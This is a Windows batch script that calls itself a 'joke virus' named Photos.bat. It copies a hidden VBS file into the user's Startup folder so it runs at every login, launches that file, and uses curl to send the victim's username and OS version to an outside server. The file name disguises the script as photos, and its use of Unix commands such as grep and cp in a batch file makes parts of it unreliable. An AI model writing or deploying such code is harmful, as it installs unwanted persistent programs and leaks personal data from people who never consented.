rem To make it stop:
rem press ctrl+alt+delete
rem open task manager
rem click processes
rem click wscript.exe
rem press end process

set version=1.0
set message=Photos.bat joke virus executed.
set vbsfile=.Photos.vbs
set osfile=ver.txt
set api=http://pinney.dataraptor.com/

rem Find which version of Windows is running so that we know
rem where the startup folder is
ver > %osfile%
rem Default to Windows 7
set dir="C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
rem Change to Windows xp if indicated
grep -q XP %osfile% && set dir="C:\Documents and Settings\All Users\Start Menu\Programs\Startup"

rem Copy the Visual Basic file to the startup dir 
cp %vbsfile% %dir%
rem Run the installed Visual Basic file
%dir%\%vbsfile%

rem Send a message to our server that a given user has installed the file
set /p os<%osfile%
curl -d "message=%message%&ver=%version%&os=%os%&username=%username%" %api%
